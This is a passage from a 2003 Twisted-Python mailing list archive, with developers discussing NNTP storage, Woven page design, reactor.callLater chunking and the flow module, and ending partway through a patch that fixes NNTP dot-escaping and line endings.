URL: </pipermail/twisted-python/attachments/20030712/c777d87d/attachment-0002.py>

From exarkun at twistedmatrix.com  Sat Jul 12 13:07:36 2003
From: exarkun at twistedmatrix.com (Jp Calderone)
Date: Sat, 12 Jul 2003 15:07:36 -0400
Subject: [Twisted-Python] Storage for a NNTP-server?
In-Reply-To: <020001c34861$ec45c990$0401a8c0@razor>
References: <020001c34861$ec45c990$0401a8c0@razor>
Message-ID: <20030712190725.GA4457@intarweb.us>

On Sat, Jul 12, 2003 at 12:39:50PM +0200, Thomas Weholt wrote:
> Was wondering what I can use for storage for a NNTP-server? I'd like all of
> my data to be kept in one place, data for a website, this news-server and
> whatever else I might think of .... storing. Is that possible?

  Anything that implements twisted.news.database.INewsStorage will do (Okay,
that class is new in CVS five minutes ago -- but all I did was rename
twisted.news.database.NewsStorage and make it inherit from Interface :).

> 
> Would it be possible to require authentication for a few given groups, --
> not all but some ?

  Sure would, but not without a few changes to the nntp code.  New cred
makes this kind of thing dead easy, if you want to give it a stab.

> 
> I was wildly inspired by tnttprss.py I found on this list a few days back.
> That was cool. But I don't want cog and/or pybsddb, because I allready got a
> SQL-database running.
> 

  There is an SQL INewsStorage implementation, but I'm not really sure what
state it is in, or if it was ever any good to begin with.  The most
used/tested NewsStorage is based on twisted.persisted.dirdbm.  It works
alright for small numbers of groups/articles, but I doubt it scales well.

  A filepile based NewsStorage would probably work very well, but I don't
yet know filepile well enough to undertake this :)

  Jp

-- 
It is practically impossible to teach good programming style to
students that have had prior exposure to BASIC: as potential
programmers they are mentally mutilated beyond hope of
regeneration.        -- Dijkstra
-------------- next part --------------
A non-text attachment was scrubbed...
Name: not available
Type: application/pgp-signature
Size: 189 bytes
Desc: not available
URL: </pipermail/twisted-python/attachments/20030712/5a84325d/attachment.sig>

From m at moshez.org  Sat Jul 12 17:05:05 2003
From: m at moshez.org (Moshe Zadka)
Date: 12 Jul 2003 23:05:05 -0000
Subject: [Twisted-Python] One big smile ...
In-Reply-To: <1058035798.1298.18.camel@mingus>
References: <1058035798.1298.18.camel@mingus>, <1058025187.933.51.camel@mingus>
	 , <004d01c34809$46f32030$0401a8c0@razor> <20030712002931.GA1208@radii>
	 <005701c34810$68f725d0$0401a8c0@razor>
	 <20030712181337.16477.qmail@green.zadka.com>
Message-ID: <20030712230505.27817.qmail@green.zadka.com>

On 12 Jul 2003, Abe Fettig <abe at fettig.net> wrote:

> class SimpleService(app.ApplicationService):
>     def startService(self):
>         self.serviceRunning = 1

Call the father's method first, instead:
app.ApplicationService.startService(self)
...
Ditto for stopService(self).
They are responsible for setting .serviceRunning

>         reactor.callLater(0, self.printHello)

Why not self.nextCall = reactor.callLater(0, ...)?

>     def stopService(self):
>         self.serviceRunning = 0
>         if hasattr(self, 'nextCall'): 
>             self.nextCall.cancel()
>             del(self.nextCall)
>         print "%s: Stopped." % self.serviceName

You also want to avoid persisting nextCall

def __getstate__(self):
    d = self.__dict__
    if 'nextCall' in d:
        del d['nextCall']
    return d

> class ServiceWebManager(resource.Resource):
>     isLeaf = 1
> 
>     def __init__(self, app):
>         self.app = app
> 
>     def render(self, request):
>         serviceName = request.args.get('service', [''])[0]
>         action = request.args.get('action', [''])[0]
>         if serviceName:
>             service = self.app.getServiceNamed(serviceName)
>             if action == 'Start':
>                 service.startService()
>             else:
>                 service.stopService()
>             request.redirect('/')

Note that your service has a bug if .startService() is called
twice without an intervening stopService(), and you present
here for users an ability to tickle that bug. You can probably
work around in many ways...

...but I prefer to having non-parents .enable() or .disable()
the service. Of course, it can start enabled by default, but
this way you have a clear distinction which methods are supposed
to be called by whom.
 
> myApp = app.Application("Test App")
> SimpleService("Service 1", myApp)
> SimpleService("Service 2", myApp)
> website = server.Site(ServiceWebManager(myApp))
> myApp.listenTCP(8008, website)

If you call it "application" insteadof "myApp", the next line
is not needed: instead of "Python"ing it, "twistd -y" it
[or maybe twistd -ny if you don't want forking]

-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From bob at redivi.com  Sat Jul 12 17:47:37 2003
From: bob at redivi.com (Bob Ippolito)
Date: Sat, 12 Jul 2003 19:47:37 -0400
Subject: [Twisted-Python] One big smile ...
In-Reply-To: <20030712230505.27817.qmail@green.zadka.com>
Message-ID: <37D9D4F6-B4C3-11D7-B516-000A95686CD8@redivi.com>

On Saturday, Jul 12, 2003, at 19:05 America/New_York, Moshe Zadka wrote:

> You also want to avoid persisting nextCall
>
> def __getstate__(self):
>     d = self.__dict__
>     if 'nextCall' in d:
>         del d['nextCall']
>     return d

Note that you shouldn't actually do it like that, you should do it like 
this:

def __getstate__(self):
	d = self.__dict__.copy()
	if 'nextCall' in d:
		del d['nextCall']
	return d

It's never ever a good idea to _break_ your live instances the instant 
they get serialized.

-bob




From mary-twisted at puzzling.org  Sat Jul 12 20:21:36 2003
From: mary-twisted at puzzling.org (Mary)
Date: Sun, 13 Jul 2003 12:21:36 +1000
Subject: [Twisted-Python] Woven: access to submodels
Message-ID: <20030713022136.GB1862@titus.home.puzzling.org>

I'm trying to replicate the functionality of http://eyes.puzzling.org/
(currently powered by a bunch of Python CGI scripts running on an Apache
webserver) in Woven.

eyes.puzzling.org is a kind of a minimalist blog, with pages that list
recent entries, the authors of the entries, and so on.

At the moment, I'm trying to replicate the authors functionality (2
different sets of pages: one which lists all the authors and links to
their individual page; and one for each author, which lists their
individual articles.

The /authors/ page (listing all the authors and linking to their
individual page) is generated by objects of the AuthorsPage subclass.

For each author, I would like to generate a /author/AUTHORNAME/ page
which lists their individual entries. I am trying to create these pages
from AuthorsPage's getDynamicChild method. The idea is to pass the
already constructed submodel -- a dictionary representing the individual
author -- to the IndividualPage object I will construct to represent the
individual author's page, rather than have IndividualPage make its own
database query for that information.

At present, as you can see below, I'm using getSubmodel to retrieve
the (dictionary) submodel associated with a particular author. However,
this returns a twisted.web.woven.model.DeferredWrapper instance, rather
than the dictionary itself. Should I make IndividualPage add callbacks
to the DeferredWrapper, or am I missing something crucial about
retrieving submodels or is this model more fundamentally incorrect?

For example, should I be passing submodels around like that at all?

If so, is there a higher level call I should make to access the
submodel?

The two classes following are the AuthorsPage and IndividualPage classes
described above.

Thanks,

-Mary

class IndividualPage(page.Page):
 
    # getTemplate munges two template files together
    template = getTemplate("/home/mary/cvs/Projects/Eye/author-page.html")

    def initialize(self, *args, **kwargs):
        self.amodel = kwargs['amodel']

    def wmfactory_author(self, request):
        return self.amodel['author']
        
class AuthorsPage(page.Page):

    template = getTemplate("/home/mary/cvs/Projects/Eye/authors-page.html")

    def initialize(self, *args, **kwargs):
        self.dbpool = kwargs['pool']
        self.authors = None

    def wmfactory_authors(self, request):
        query = self.dbpool.runQuery("SELECT DISTINCT posts.name, link, password FROM authors, posts WHERE authors.name = posts.name ORDER BY name;")
        query.addCallback(self.makeAuthors)
        return query
    
    def makeAuthors(self, rows):
        '''
        Construct self.authors, return them as a list
        @return a list of author dictionaries
        '''
        authors = {}
        for row in rows:
            (name, link, password) = row
            authors[name] = {
                'name' : name,
                'link' : link,
                'password' : password
            }
        return authors

    def wvfactory_alink(self, request, node, model):
        return AuthorLink(model)

    def getDynamicChild(self, name, request):
        return IndividualPage(amodel=self.getSubmodel('authors')[name]))



From m at moshez.org  Sat Jul 12 22:29:51 2003
From: m at moshez.org (Moshe Zadka)
Date: 13 Jul 2003 04:29:51 -0000
Subject: [Twisted-Python] One big smile ...
In-Reply-To: <37D9D4F6-B4C3-11D7-B516-000A95686CD8@redivi.com>
References: <37D9D4F6-B4C3-11D7-B516-000A95686CD8@redivi.com>
Message-ID: <20030713042951.8615.qmail@green.zadka.com>

[Me]
> You also want to avoid persisting nextCall
>
> def __getstate__(self):
>     d = self.__dict__
>     if 'nextCall' in d:
>         del d['nextCall']
>     return d

[Bob]
> Note that you shouldn't actually do it like that, you should do it like 
> this:
> 
> def __getstate__(self):
> 	d = self.__dict__.copy()
> 	if 'nextCall' in d:
> 		del d['nextCall']
> 	return d
> 
> It's never ever a good idea to _break_ your live instances the instant 
> they get serialized.

Right, I meant to write ".copy()". Thanks for the fix!

-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From m at moshez.org  Sat Jul 12 22:36:13 2003
From: m at moshez.org (Moshe Zadka)
Date: 13 Jul 2003 04:36:13 -0000
Subject: [Twisted-Python] Woven: access to submodels
In-Reply-To: <20030713022136.GB1862@titus.home.puzzling.org>
References: <20030713022136.GB1862@titus.home.puzzling.org>
Message-ID: <20030713043613.8689.qmail@green.zadka.com>

On Sun, 13 Jul 2003, Mary <mary-twisted at puzzling.org> wrote:

>     def getDynamicChild(self, name, request):
>         return IndividualPage(amodel=self.getSubmodel('authors')[name]))

Rar! You are very evil.
Please do not reinvent SQL in Python: write *another* select query, that
only selects posts from this author.
 
-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From jml at ids.org.au  Sun Jul 13 11:18:08 2003
From: jml at ids.org.au (Jonathan Lange)
Date: Mon, 14 Jul 2003 03:18:08 +1000
Subject: [Twisted-Python] new bugtracker
In-Reply-To: <1058024658.28521.0.camel@biproc>
References: <20030712151650.GA7767@radii> <1058024658.28521.0.camel@biproc>
Message-ID: <20030713171808.GB15139@mumak.net>

On Sat, Jul 12, 2003 at 05:44:18PM +0200, Philippe Lafoucri?re wrote:
> On Sat, 2003-07-12 at 17:16, Christopher Armstrong wrote:
> > I've finished setting up Roundup to replace our sourceforge based
> > bugtracker. I've migrated most of the open bugs that were on
> > sourceforge; so everyone go create a user and get crackin'.
> > 
>
> What will be the future of Issues ?

As the Billy-Goats of Time cross the Bridge of Destiny and are attacked by the
Troll of Fate, so too must the Broom of Eternity sweep all things into the
Dustpan of History.

I tried to send an email to the list a week ago talking about the future of
Issues. Basically, if Twisted isn't using it, I'm not interested in
it. Further, I discourage further use and maintenance, as it doesn't have a
user base, and there are already too many partially-finished, under-used Free
Software projects in the world.

On a more personal note, I *do* think it kind of sucks that Issues isn't
getting used by Twisted, but I'm not particularly bitter about it. It's been
good working on it, and I hope to continue using Twisted and contributing to
it.

cheers,
jml
-------------- next part --------------
A non-text attachment was scrubbed...
Name: not available
Type: application/pgp-signature
Size: 189 bytes
Desc: not available
URL: </pipermail/twisted-python/attachments/20030714/37dde0a2/attachment.sig>

From lafou at wanadoo.fr  Sun Jul 13 03:23:43 2003
From: lafou at wanadoo.fr (Philippe =?ISO-8859-1?Q?Lafoucri=E8re?=)
Date: 13 Jul 2003 11:23:43 +0200
Subject: [Twisted-Python] PicturePile
Message-ID: <1058088222.28521.2.camel@biproc>

Hi

I'm trying to test to PicturePile files (from woven tutorial).
I have always the same error :


$ python picturepile.py /home/gravis/Images/
Traceback (most recent call last):
  File "picturepile.py", line 10, in ?
    class DirectoryListing(page.Page):
  File "picturepile.py", line 13, in DirectoryListing
    templateDirectory = os.path.split(os.path.abspath(__file__))[0]
NameError: name '__file__' is not defined


sounds like a bug, but I want to check with you




From mary-twisted at puzzling.org  Sun Jul 13 03:12:42 2003
From: mary-twisted at puzzling.org (Mary)
Date: Sun, 13 Jul 2003 19:12:42 +1000
Subject: [Twisted-Python] Woven: access to submodels
In-Reply-To: <20030713043613.8689.qmail@green.zadka.com>
References: <20030713022136.GB1862@titus.home.puzzling.org> <20030713043613.8689.qmail@green.zadka.com>
Message-ID: <20030713091242.GB2743@titus.home.puzzling.org>

On Sun, Jul 13, 2003, Moshe Zadka wrote:
> On Sun, 13 Jul 2003, Mary <mary-twisted at puzzling.org> wrote:
> 
> >     def getDynamicChild(self, name, request):
> >         return IndividualPage(amodel=self.getSubmodel('authors')[name]))
> 
> Rar! You are very evil.
> Please do not reinvent SQL in Python: write *another* select query, that
> only selects posts from this author.

I have to anyway... the SELECT query you saw doesn't extract any posts
at all, it extracts the names of authors (posts.names -- plus a little
extraneous information) who have made posts.

So I take it that in this design the arguments to __init__/initialize of
child IndividualPage would be just the name of the author?

This leaves a few questions still:

 1. Pure design issue: There still needs to be a query along the lines
 of "does this author in fact exist?" so that /author/Mary/ generates a
 list of my articles and /author/Humphrey/ generates an error page. This
 was the query I was trying to avoid by passing the submodel around --
 the "get me all posts by Mary" query was always going to be part of
 IndividualPage.

 At present, my model does not have the IndividualPage make a query to
 this effect, it relies on its parent AuthorsPage to have accessed a
 list of all authors in the system (actually, the SELECT query given
 ignores authors who have made no posts, a deliberate choice).

 Should I have IndividualPage access this information itself? If not, I
 still continue to rely on the information presently accesible to
 AuthorsPage -- how should I make this information available to
 IndividualPage? (related to point 3). If I don't use the authors model,
 then I have to make an essentially identical query anyway. There's a
 few options about where I make the query, how many times I make it, and
 where I should store the results. And of course, where (and how) I pass
 a Deferred around.

 2. More generally, since I'm unfamiliar with the design pattern(s)
 associated with Woven, what level of information sharing in this sense
 is acceptable between parents and children? (Pointers to other sources
 of information would be welcome, since this question is pretty open
 ended)?

 3. (Generalisation of point 1.) To whatever extent it is even
 acceptable to share query results of some kind between parents and
 children (perhaps in the form of Models), what functions do I call in
 Woven to share the information? Should an object ever access its own
 sub-models?

-Mary



From m at moshez.org  Sun Jul 13 04:04:03 2003
From: m at moshez.org (Moshe Zadka)
Date: 13 Jul 2003 10:04:03 -0000
Subject: [Twisted-Python] Woven: access to submodels
In-Reply-To: <20030713091242.GB2743@titus.home.puzzling.org>
References: <20030713091242.GB2743@titus.home.puzzling.org>, <20030713022136.GB1862@titus.home.puzzling.org> <20030713043613.8689.qmail@green.zadka.com>
Message-ID: <20030713100403.17396.qmail@green.zadka.com>

On Sun, 13 Jul 2003, Mary <mary-twisted at puzzling.org> wrote:

>  1. Pure design issue: There still needs to be a query along the lines
>  of "does this author in fact exist?" so that /author/Mary/ generates a
>  list of my articles and /author/Humphrey/ generates an error page. This
>  was the query I was trying to avoid by passing the submodel around --
>  the "get me all posts by Mary" query was always going to be part of
>  IndividualPage.

Ah, I see. Well, a somewhat thorny issue in current web code [that
we may fix someday in the future, but you're not interested in that]
is that child-getting is synchronous. This means that an easy answer
is currently beyond us. A non-easy way to do that is to hack around:

from twisted.web import resource, server

class MaybeIndividualPage(resource.Resource):

    isLeaf = 1

    def __init__(self, author):
        resource.Resource.__init__(self)
        self.author = author

    def render(self, request):
        def raiseException():
            raise LookupError
        def simulateServer(value):
            if value == server.NOT_DONE_YET:
                return
            request.write(value)
            request.finish()
        query = deferredWhichIsTrueIfExists(self.author).addCallback(
        lambda x: (x or error.NoResource()) and
             IndividualPage(self.author).getChildForRequest(request
                                            ).render(request)).addCallback(
            simulateServer)
        return server.NOT_DONE_YET

Then, in getDynamicChild, return MaybeIndividualPage(author) instead
of IndividualPage(author).

Basically, this is explicitly asyncing the child-getting mechanism
by going through the async-ready render method. I realize it's not
the best-looking code in the world, but it should get the job done.


>  2. More generally, since I'm unfamiliar with the design pattern(s)
>  associated with Woven, what level of information sharing in this sense
>  is acceptable between parents and children? (Pointers to other sources
>  of information would be welcome, since this question is pretty open
>  ended)?

Well, we don't have any real understanding of this issue either, since
Woven is not old enough. My gut instinct would be towards "pretty high",
though.

-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From m at moshez.org  Sun Jul 13 06:24:34 2003
From: m at moshez.org (Moshe Zadka)
Date: 13 Jul 2003 12:24:34 -0000
Subject: [Twisted-Python] Twisted CallLater: Advanced Usage
Message-ID: <20030713122434.21978.qmail@green.zadka.com>

Those of you who heard my talks, either at Europython or Strakt, probably
remember me going on about how to use reactor.callLater(0,) to partition
algorithms into bite-size chunks, that would not delay the main loop too
much. This a topic which is interesting to me. I'm still waiting for glyph
to write the ultimate "What is Blocking" treatise, but I may give up and
write something myself. In the meantime, I want to present to advanced
examples of what you can achieve by using this technique.

optFactorial is an optimized version of the factorial function from my
talk. The trick here is to do 10 steps (or whatever argument is given
to us, if the user wants to optimize further by tweaking) at a time.
I have not profiled: possibly, it only becomes worth the complexity
at a much higher step number. However, this is an important example if
you are writing algorithms. It showcases how the assignment-paradigm
and the tail-call paradigm can be combined seamlessly to produce a
more complicated, but more efficient, whole.

def optFactorial(n, steps=10, d=None, acc=1L):
    d = d or defer.Deferred()
    for i in range(steps):
        if n==1: 
            d.callback(acc)
            break
        n, acc = n-1, acc*n
    else:
        reactor.callLater(0, optFactorial, n, steps, d, acc)
    return d

os_path_walk is a reimplementation of os.path.walk, from Python's
standard library, in an asynchronous manner. Here the word "asynchronous"
is literal: while it will call the visit() function with the same arguments,
in the same order, it does not guarantee when it will do so: certainly,
it is not likely to finish its work by the time it returns. yield, explicit
and implicit .next() calls and recursion combine to make sure that we will
never delay the mainloop more than the time it takes to do one os.listdir.
Note that unlike the os.path.walk function, here an exception anywhere
terminates the loop and lets us now of the failure. 

This example, in particular, shows how frighteningly similar Twisted
can be to threads :) In effect, this is much like doing something
like

reactor.runInThread(os.path.walk,
                    path,
                    lambda arg, dirname, filenames:
                        reactor.callFromThread(visit, arg, dirname, filenames),
                    arg)

except without the overhead of thread spawning and thread communication
[mutexes, etc.] However, note that many of the thread caveats remain:
if you have other code running, this code cannot know how many of the
visit() functions will be called by the time it runs.

from __future__ import generators
def os_path_walk(path, visit, arg):
    d = defer.Deferred()
    def walk(path):
        files = os.listdir(path)
        visit(arg, path, files)
        for file in files:
            yield None
            if os.path.isdir(file):
                for _ in walk(os.path.join(path, file):
                    pass
    next = walk(path).next
    def caller():
        try:
            next()
        except StopIteration:
            d.callback(None)
        except:
            d.errback(sys.exc_info()[1])
        else:
            reactor.callLater(0, caller)
    caller()
    return d

-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From exarkun at twistedmatrix.com  Sun Jul 13 13:28:07 2003
From: exarkun at twistedmatrix.com (Jp Calderone)
Date: Sun, 13 Jul 2003 15:28:07 -0400
Subject: [Twisted-Python] PicturePile
In-Reply-To: <1058088222.28521.2.camel@biproc>
References: <1058088222.28521.2.camel@biproc>
Message-ID: <20030713192422.GA24564@intarweb.us>

On Sun, Jul 13, 2003 at 11:23:43AM +0200, Philippe Lafoucri?re wrote:
> Hi
> 
> I'm trying to test to PicturePile files (from woven tutorial).
> I have always the same error :
> 
> 
> $ python picturepile.py /home/gravis/Images/
> Traceback (most recent call last):
>   File "picturepile.py", line 10, in ?
>     class DirectoryListing(page.Page):
>   File "picturepile.py", line 13, in DirectoryListing
>     templateDirectory = os.path.split(os.path.abspath(__file__))[0]
> NameError: name '__file__' is not defined
> 

  Run them with "twistd -y" instead of "python".

  I think the "if __name__ == '__main__':" checks should all be removed,
since clearly they won't work (file is never defined when that test is true).

  Jp

-- 
http://catandgirl.com/view.cgi?44
-------------- next part --------------
A non-text attachment was scrubbed...
Name: not available
Type: application/pgp-signature
Size: 189 bytes
Desc: not available
URL: </pipermail/twisted-python/attachments/20030713/1c7c71c2/attachment.sig>

From lafou at wanadoo.fr  Sun Jul 13 13:56:03 2003
From: lafou at wanadoo.fr (Philippe =?ISO-8859-1?Q?Lafoucri=E8re?=)
Date: 13 Jul 2003 21:56:03 +0200
Subject: [Twisted-Python] PicturePile
In-Reply-To: <20030713192422.GA24564@intarweb.us>
References: <1058088222.28521.2.camel@biproc>
	 <20030713192422.GA24564@intarweb.us>
Message-ID: <1058126163.927.1.camel@biproc>

>   Run them with "twistd -y" instead of "python".
> 
>   I think the "if __name__ == '__main__':" checks should all be removed,
> since clearly they won't work (file is never defined when that test is true).
> 
>   Jp

Ho that works better, thanks a lot.
why is there so many ways to create an application (I mean, via twistd,
mktap, directly via the python script, etc.) ? 




From Martin.Moellenbeck at t-online.de  Sun Jul 13 14:15:16 2003
From: Martin.Moellenbeck at t-online.de (=?iso-8859-1?Q?Martin_M=F6llenbeck?=)
Date: Sun, 13 Jul 2003 22:15:16 +0200
Subject: [Twisted-Python] new cred with pb
Message-ID: <001801c3497b$7a013390$0200a8c0@joshua>

hello,

is it possible to use the new cred with pb?

Has anybody an example or any howtos?

thanks and regards 

Martin





From bob at redivi.com  Sun Jul 13 14:47:38 2003
From: bob at redivi.com (Bob Ippolito)
Date: Sun, 13 Jul 2003 16:47:38 -0400
Subject: [Twisted-Python] Twisted CallLater: Advanced Usage
In-Reply-To: <20030713122434.21978.qmail@green.zadka.com>
Message-ID: <3D657434-B573-11D7-B516-000A95686CD8@redivi.com>

On Sunday, Jul 13, 2003, at 08:24 America/New_York, Moshe Zadka wrote:

> from __future__ import generators
> def os_path_walk(path, visit, arg):
>     d = defer.Deferred()
>     def walk(path):
>         files = os.listdir(path)
>         visit(arg, path, files)
>         for file in files:
>             yield None
>             if os.path.isdir(file):
>                 for _ in walk(os.path.join(path, file):
>                     pass
>     next = walk(path).next
>     def caller():
>         try:
>             next()
>         except StopIteration:
>             d.callback(None)
>         except:
>             d.errback(sys.exc_info()[1])
>         else:
>             reactor.callLater(0, caller)
>     caller()
>     return d

This is close to what I did when I wrote 'flow' (different from cce's), 
except I did the "caller" phase as a function-wrapper (akin to 
staticmethod or classmethod), and I made it smarter, such that it could 
return a value, get the result of a deferred (the next() wouldn't 
happen until the result of the deferred was ready), etc.

AFAIK, since cce's flow is in Twisted now, this example is better 
served using that.  Also, you should be showing people Failure() 
instead of sys.exc_info()[1].

-bob




From cce at clarkevans.com  Sun Jul 13 16:12:44 2003
From: cce at clarkevans.com (Clark C. Evans)
Date: Sun, 13 Jul 2003 22:12:44 +0000
Subject: [Twisted-Python] Twisted CallLater: Advanced Usage
In-Reply-To: <20030713122434.21978.qmail@green.zadka.com>
References: <20030713122434.21978.qmail@green.zadka.com>
Message-ID: <20030713221244.GA69058@polya.axista.com>

On Sun, Jul 13, 2003 at 12:24:34PM -0000, Moshe Zadka wrote:
| from __future__ import generators
| def os_path_walk(path, visit, arg):
|     d = defer.Deferred()
|     def walk(path):
|         files = os.listdir(path)
|         visit(arg, path, files)
|         for file in files:
|             yield None
|             if os.path.isdir(file):
|                 for _ in walk(os.path.join(path, file):
|                     pass
|     next = walk(path).next
|     def caller():
|         try:
|             next()
|         except StopIteration:
|             d.callback(None)
|         except:
|             d.errback(sys.exc_info()[1])
|         else:
|             reactor.callLater(0, caller)
|     caller()
|     return d

You could rewrite this using flow:

    from __future__ import generators
    import os
    from twisted.flow import flow
    
    def hierlistdir(path):
        names = os.listdir(path)
        yield (path, names)
        for name in names:
            subpath = os.path.join(path,name)
            if os.path.isdir(subpath):
                for x in hierlistdir(subpath):
                    yield x
    
    def process(path, visit, arg):
        lst = flow.wrap(hierlistdir(path))
        yield lst
        for (path, names) in lst:
            visit(arg, path, names)
            yield lst
    
    def os_path_walk(path, visit, arg):
        return flow.Deferred(process(path, visit, arg))

Although, really, if you were to use flow, you would not
bother to use a vistor pattern, you would just write
your processor as a generator instead.

    def print_if_contains(path, match):
        lst = flow.wrap(hierlistdir(path))
        nMatch = 0
        yield lst
        for (path, names) in lst:
            if match in names:
                nMatch += 1
                print nMatch, path
            yield lst
    
    d = flow.Deferred(print_if_contains("/some/path","someFile"))
    d.addCallback(lamda _: reactor.stop())

Where flow "shines" is when the input source blocks, for example,
when reading from a socket (see flow.Protocol), or via an async 
PostgreSQL database, or an LDAP connection.   Or when there are 
multiple stages of a given flow (a -> b -> c), or when you have
two stages (async PostgreSQL and LDAP queries) which need to
be merged to generate a HTML page...

Best,

Clark

P.S.  Here is the other example using flow

from __future__ import generators
from twisted.internet import reactor
from twisted.flow import flow
from twisted.python import util

def flowFactorial(n, steps = 10):
    coop = flow.Cooperate()
    acc = 1L
    while True:
        for i in range(steps):
            if 1 == n:
                yield acc
                return
            n, acc = n - 1, acc * n
        yield coop

d = flow.Deferred(flowFactorial(13))
d.addCallback(util.println)
d.addCallback(lambda _: reactor.stop())
reactor.run()




From cce at clarkevans.com  Sun Jul 13 16:43:18 2003
From: cce at clarkevans.com (Clark C. Evans)
Date: Sun, 13 Jul 2003 22:43:18 +0000
Subject: [Twisted-Python] Twisted CallLater: Advanced Usage
In-Reply-To: <20030713221244.GA69058@polya.axista.com>
References: <20030713122434.21978.qmail@green.zadka.com> <20030713221244.GA69058@polya.axista.com>
Message-ID: <20030713224318.GA69137@polya.axista.com>

My last example was wrong, pls disregard. Since hierlistdir does not 
yield a flow.Instruction (flow.Cooperate() or a flow.Stage) it does not
need to be wrapped.   Also, I forgot to have the intermediate 
generator yield flow.Cooperate to return control to the reactor. 
The last example would have been correct if hierlistdir() was
blocking, like an LDAP/SQL query, or a protocol.  Sorry.

    from __future__ import generators
    import os
    from twisted.flow import flow
    
    def hierlistdir(path):
        """ generator which returns a list of (path, files) 
            tuples for each item in the hierarchy.   Since this
            is a syncronous generator, you could simply do
                print list(hierlistdir("/Some/Path") 
            to verify its operation
        """
        names = os.listdir(path)
        yield (path, names)
        for name in names:
            subpath = os.path.join(path,name)
            if os.path.isdir(subpath):
                for x in hierlistdir(subpath):
                    yield x

    def coopvisit(path, visit, arg):
        """ for each item in the generator, call the visitor
            and then yield Cooperate() so that other requess
            can be handled by the reactor
        """
        for (path,names) in hierlistdir(path):
            visit(arg,path,names)
            yield flow.Cooperate()

    def os_path_walk(path,visit,arg):
        """ provide a nice interface that hides the use of flow,
            and somewhat complies with Moshe's example.
        """
        return flow.Deferred(coopvisit(path,visit,arg))

Although, really, if you were to use flow, you would not
bother to use a vistor pattern, you would just write
your processor as a generator instead.

    def print_if_contains(path, match):
        nMatch = 0
        for (path, names) in hierlistdir(path):
            if match in names:
                nMatch += 1
                print nMatch, path
            yield flow.Cooperate()
     
    d = flow.Deferred(print_if_contains("/some/path","someFile"))
    d.addCallback(lamda _: reactor.stop())

Where flow "shines" is when the input source blocks, for example,
when reading from a socket (see flow.Protocol), or via an async 
PostgreSQL database, or an LDAP connection.   Or when there are 
ultiple stages of a given flow (a -> b -> c), or when you have
two stages (async PostgreSQL and LDAP queries) which need to
be merged to generate a HTML page...

On Sun, Jul 13, 2003 at 12:24:34PM -0000, Moshe Zadka wrote:
| from __future__ import generators
| def os_path_walk(path, visit, arg):
|     d = defer.Deferred()
|     def walk(path):
|         files = os.listdir(path)
|         visit(arg, path, files)
|         for file in files:
|             yield None
|             if os.path.isdir(file):
|                 for _ in walk(os.path.join(path, file):
|                     pass
|     next = walk(path).next
|     def caller():
|         try:
|             next()
|         except StopIteration:
|             d.callback(None)
|         except:
|             d.errback(sys.exc_info()[1])
|         else:
|             reactor.callLater(0, caller)
|     caller()
|     return d

from __future__ import generators
from twisted.internet import reactor
from twisted.flow import flow
from twisted.python import util

def flowFactorial(n, steps = 10):
    coop = flow.Cooperate()
    acc = 1L
    while True:
        for i in range(steps):
            if 1 == n:
                yield acc
                return
            n, acc = n - 1, acc * n
        yield coop

d = flow.Deferred(flowFactorial(13))
d.addCallback(util.println)
d.addCallback(lambda _: reactor.stop())
reactor.run()
 



From smurf at smurf.noris.de  Sun Jul 13 16:53:48 2003
From: smurf at smurf.noris.de (Matthias Urlichs)
Date: Mon, 14 Jul 2003 00:53:48 +0200
Subject: [Twisted-Python] t.p.nntp woes
Message-ID: <pan.2003.07.13.22.53.44.624640@smurf.noris.de>

Hi,

I seem to have found a few bugs in the current NNTP code.

- The client->server transfer does not escape leading '.' at all.
  To reproduce: edit the testcase to have one dot, not three.
- The server->client article transfer actually uses \r\r\n line endings.
  Ouch!
- The server->client code does not escape leading '.' when the
  linefeed/dot pair is on a block boundary.
- Article length is not preserved; the client drops the trailing
  linefeed when receiving article bodies.

Besides these easily-fixed problems, twisted.protocols.nntp stores
articles as a mix of host and network storage formats.

Network format has dots escaped and ends lines with CRLF.
Host format has dots not escaped and ends lines with LF only.

IMHO it doesn't make sense to mix these two. Either the NNTP code can
store the data in unchanged form (it needs to convert articles for local
processing), or it can't (it needs to convert articles when re-sending).
It doesn't make sense to require special handling in _both_ cases.

Since twisted.news.database expects CRLF line endings for header
analysis, I have changed the server side to use network format.

On the other hand, the client side should probably use host format,
since that is what a client usually needs.

In any way, the test case submits an article. It should get the original
article back, EXACTLY the way it was. The following patch fixes the code
so that this in fact happens.

This patch requires that article backends are updated (escape those
dots!). If that's unacceptable (personally I don't think so),
I might be persuaded to add a compatibility flag.


===== twisted/protocols/basic.py 1.38 vs edited =====
--- 1.38/twisted/protocols/basic.py	Wed Jun 25 14:06:38 2003
+++ edited/twisted/protocols/basic.py	Sun Jul 13 23:55:24 2003
@@ -340,7 +340,7 @@
     lastSent = ''
     deferred = None
 
-    def beginFileTransfer(self, file, consumer, transform):
+    def beginFileTransfer(self, file, consumer, transform = None):
         """Begin transferring a file
         
         @type file: Any file-like object
@@ -377,7 +377,8 @@
             self.consumer.unregisterProducer()
             return
         
-        chunk = self.transform(chunk)
+        if self.transform:
+            chunk = self.transform(chunk)
         self.consumer.write(chunk)
         self.lastSent = chunk[-1]
 
===== twisted/protocols/nntp.py 1.29 vs edited =====
--- 1.29/twisted/protocols/nntp.py	Thu Jul  3 22:55:47 2003
+++ edited/twisted/protocols/nntp.py	Mon Jul 14 00:10:18 2003
@@ -461,9 +461,11 @@
 
     def _stateArticle(self, line):
         if line != '.':
+            if line.startswith('.'):
+                line = line[1:]
             self._newLine(line, 0)
         else:
-            self.gotArticle('\n'.join(self._endState()))
+            self.gotArticle('\n'.join(self._endState())+'\n')
 
 
     def _stateHead(self, line):
@@ -475,16 +477,18 @@
 
     def _stateBody(self, line):
